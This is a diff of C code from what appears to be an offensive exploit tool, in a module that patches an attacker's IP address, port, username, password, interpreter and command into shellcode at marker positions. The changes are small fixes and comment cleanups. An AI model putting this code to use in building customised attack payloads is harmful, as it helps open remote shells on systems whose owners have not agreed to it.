@@ -1,25 +1,25 @@
 /*
  * Shellcode personalization
-*/
+ */
 
-//
+// print error message, if a mark is not found
 void mark_not_found(const char *type)
 {
     printf("[!] ERROR: %s mark not found. Check your payload\n", type);
     exit(-1);
 }
 
-//
+// ip = 32bits unsigned integer
 void set_ip(char *shellcode, u_int32_t ip)
 {
     char *ptr = NULL;
- 
+
     if(!(ptr = index(shellcode, ip_mark))) mark_not_found("IP");
- 
+
     *(u_int32_t*)ptr = ip;
 }
 
-//
+// port = 16bits unsigned integer
 void set_port(char *shellcode, unsigned short port)
 {
     char *ptr = NULL;
@@ -30,7 +30,7 @@ void set_port(char *shellcode, unsigned short port)
     *(u_int16_t*)ptr = port;
 }
 
-//username = 4 chars
+// username = 4 chars
 void set_username(char *shellcode, char *username)
 {
     char *ptr = NULL;
@@ -45,7 +45,7 @@ void set_username(char *shellcode, char *username)
     strncpy(ptr, name, 4);
 }
 
-//password = 4 chars
+// password = 4 chars
 void set_password(char *shellcode, char *password)
 {
     char *ptr1 = NULL, *ptr2 = NULL;
@@ -68,7 +68,7 @@ void set_password(char *shellcode, char *password)
     strncpy(ptr2, pass, 3);
 }
 
-//
+// interpreter (/bin/bash, /usr/bin/perl, etc...)
 void set_interpreter(char *shellcode, char *_interpreter)
 {
     char *ptr = NULL;
@@ -93,27 +93,30 @@ void set_script(char *shellcode, char *_cmd, char *file)
 {
     char *ptr = NULL;
     char *cmd = _cmd;
+    int cmd_len = 0;
 
     if(!cmd && !file) cmd = "echo test";
+    cmd_len = strlen(cmd);
 
     if(!(ptr = index(shellcode, script_mark))) mark_not_found("script");
 
     if(cmd)
     {
-        payload_len += strlen(cmd);
-        if(!realloc(sh_buffer, payload_len)) exit(-1);
+        payload_len += cmd_len;
+        if(!realloc(sh_buffer, payload_len+1)) exit(-1);
 
-        strcpy(ptr, cmd);
+        strncpy(ptr, cmd, cmd_len);
+        ptr += cmd_len;
+        *ptr = '\0';
     }
     else if(file)
     {
         FILE *script_file = NULL;
-        //char _char;
         long script_len = 0;
         int i;
 
         if(!(script_file = fopen(file, "r"))) {
-            perror("Error opening script file");            
+            perror("Error opening script file");
             exit(-1);
         }
 
@@ -121,7 +124,7 @@ void set_script(char *shellcode, char *_cmd, char *file)
         script_len = ftell(script_file);
 
         payload_len += script_len;
-        if(!realloc(sh_buffer, payload_len)) exit(-1);
+        if(!realloc(sh_buffer, payload_len+1)) exit(-1);
 
         rewind(script_file);
 
@@ -134,6 +137,8 @@ void set_script(char *shellcode, char *_cmd, char *file)
             ptr++;
         }
 */
+        *(ptr++) = '\0';
+
         fclose(script_file);
     }
 }
@@ -141,7 +146,7 @@ void set_script(char *shellcode, char *_cmd, char *file)
 //
 void personalize_shellcode(void)
 {
-    printf("[DBG] Payload before personalization:\n%s\n", sh_buffer);
+    //printf("[DBG] Payload before personalization:\n%s\n", sh_buffer);
     if(args.my_ip) set_ip(sh_buffer, args.my_ip);
     if(args.my_port) set_port(sh_buffer, args.my_port);
     if(args.my_username) set_username(sh_buffer, args.my_username);
@@ -149,8 +154,8 @@ void personalize_shellcode(void)
     if(args.payload_index == 3)
     {
      set_interpreter(sh_buffer, args.interpreter);
-     set_script(sh_buffer, args.perl_code, args.perl_file);
+     set_script(sh_buffer, args.script_code, args.script_file);
     }
-    printf("[DBG] Payload after personalization:\n%s\n", sh_buffer);
+    //printf("[DBG] Payload after personalization:\n%s\n", sh_buffer);
 }
 
